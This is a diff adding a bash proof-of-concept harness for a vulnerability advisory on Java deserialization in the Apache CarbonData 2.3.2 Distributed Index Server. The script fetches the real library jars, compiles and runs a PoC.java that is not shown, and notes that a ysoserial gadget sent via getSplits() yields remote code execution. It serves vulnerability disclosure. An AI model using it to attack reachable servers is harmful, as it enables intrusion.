@@ -1,0 +1,76 @@
+#!/usr/bin/env bash
+#
+#
+# Apache CarbonData 2.3.2 Index Server Java Deserialization
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://carbondata.apache.org
+# Affected version: 2.3.2
+#
+# Summary: Apache CarbonData is an open-source, indexed columnar data
+# storage format and database management system designed for fast interactive
+# analytics on petabyte-scale big data platforms like Apache Hadoop and
+# Apache Spark.
+#
+# Desc: Apache CarbonData suffer from a Java deserialization vulnerability
+# on the Distributed Index Server. The IndexInputFormat Writable read
+# over the Hadoop IPC endpoint deserializes a wire blob (filterResolverBytes)
+# through a ClassLoaderObjectInputStream with no ObjectInputFilter, so
+# under the default SIMPLE Hadoop authentication a remote attacker who
+# can reach the endpoint can have an arbitrary attacker-named class deserialized.
+# This becomes RCE when a gadget class is on the server classpath, plausible
+# via the Spark/Hadoop dependencies CarbonData ships with.
+#
+# Tested on: Microsoft Windows 10 (x86-64)
+#            OpenJDK Temurin 21.0.6
+#            carbondata-core-2.3.2.jar
+#            carbondata-common 2.3.2
+#            commons-io 2.11.0
+#            log4j 1.2.17
+#            libthrift 0.13.0
+#            slf4j 1.7.30
+#            commons-codec 1.15
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6030
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6030
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+HERE="$(cd "$(dirname "$0")" && pwd)"
+case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) SEP=";"; jp(){ cygpath -w "$1"; } ;; *) SEP=":"; jp(){ printf '%s' "$1"; } ;; esac
+command -v javac >/dev/null || { echo "[!] Need a JDK (javac)"; exit 1; }
+W="$HERE/carbondata_poc_build"; rm -rf "$W"; mkdir -p "$W/lib"
+
+M="https://repo1.maven.org/maven2"
+echo "[*] Fetching real CarbonData 2.3.2 + deps ..."
+declare -a JARS=(
+  "org/apache/carbondata/carbondata-core/2.3.2/carbondata-core-2.3.2.jar"
+  "org/apache/carbondata/carbondata-common/2.3.2/carbondata-common-2.3.2.jar"
+  "commons-io/commons-io/2.11.0/commons-io-2.11.0.jar"
+  "log4j/log4j/1.2.17/log4j-1.2.17.jar"
+  "org/apache/thrift/libthrift/0.13.0/libthrift-0.13.0.jar"
+  "org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar"
+  "commons-codec/commons-codec/1.15/commons-codec-1.15.jar"
+)
+for j in "${JARS[@]}"; do curl -fsSL "$M/$j" -o "$W/lib/$(basename "$j")" || { echo "[!] Download failed: $j"; exit 1; }; done
+CP=""; for x in "$W"/lib/*.jar; do CP="${CP:+$CP$SEP}$(jp "$x")"; done
+
+echo "[*] Compiling the PoC.java against the real carbondata-core ..."
+javac -cp "$CP" -d "$(jp "$W")" "$(jp "$HERE/PoC.java")" || { echo "[!] Build failed"; exit 1; }
+
+echo "[*] Running: real ObjectSerializationUtil.convertStringToObject on an attacker-crafted string"
+echo "-----------------------------------------------------------------"
+( cd "$W" && java -cp ".${SEP}$CP" PoC )
+echo "-----------------------------------------------------------------"
+echo "[*] Attacker class readObject() ran inside the real CarbonData deser sink (no ObjectInputFilter)."
+echo "    On a running Index Server a getSplits() RPC with a ysoserial gadget in filterResolverBytes = RCE."
